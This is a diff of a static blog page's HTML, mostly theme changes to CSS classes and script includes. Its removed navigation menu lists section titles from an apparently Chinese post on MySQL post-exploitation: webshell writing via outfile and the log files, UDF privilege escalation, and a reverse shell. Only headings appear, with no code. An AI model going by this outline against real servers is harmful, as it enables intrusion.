-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%88%A9%E7%94%A8outfile%E5%87%BD%E6%95%B0%E5%86%99shell"><span class="nav-text">0x01 利用outfile函数写shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%88%A9%E7%94%A8dumpfile%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8Cudf%E6%8F%90%E6%9D%83"><span class="nav-text">0x02 利用dumpfile函数进行udf提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5shell"><span class="nav-text">0x03 开启全局日志写入shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%BC%80%E5%90%AF%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5shell"><span class="nav-text">0x04 开启慢查询日志写入shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%88%A9%E7%94%A8system%E5%87%BD%E6%95%B0%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">0x05 利用system函数反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">0x06 小知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#secure-file-priv%E5%9C%A8%E4%B8%8D%E5%90%8Cmysql%E7%89%88%E6%9C%AC%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">secure_file_priv在不同mysql版本的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E8%AF%A5udf-dll-so-%E6%96%87%E4%BB%B6%E7%9A%8416%E8%BF%9B%E5%88%B6%E5%80%BC-hex"><span class="nav-text">如何获取该udf.dll(.so)文件的16进制值(hex)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap%E7%9A%84udf-dll-so-%E6%98%AF%E9%80%9A%E8%BF%87%E5%BC%82%E6%88%96%E7%BC%96%E7%A0%81%E7%9A%84%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B9%8B%E5%89%8D%E9%9C%80%E8%A6%81%E8%A7%A3%E7%A0%81"><span class="nav-text">sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dumpfile%E5%92%8Coutfile%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E4%B8%80%E6%A0%B7"><span class="nav-text">dumpfile和outfile有什么不一样</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
@@ -479,7 +541,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -510,10 +572,16 @@
 
 
 
+
+
     
 <script src="/js/local-search.js"></script>
 
 
+
+
+    
+<script src="/js/code-block.js"></script>
 
 
 
@@ -522,12 +590,18 @@
 <div class="post-scripts">
     
         
-<script src="/js/left-side-toggle.js"></script>
+<script src="/js/post-helper.js"></script>
 
+        
+            
 <script src="/js/libs/anime.min.js"></script>
 
+        
+        
+            
 <script src="/js/toc.js"></script>
 
+        
     
 </div>
 
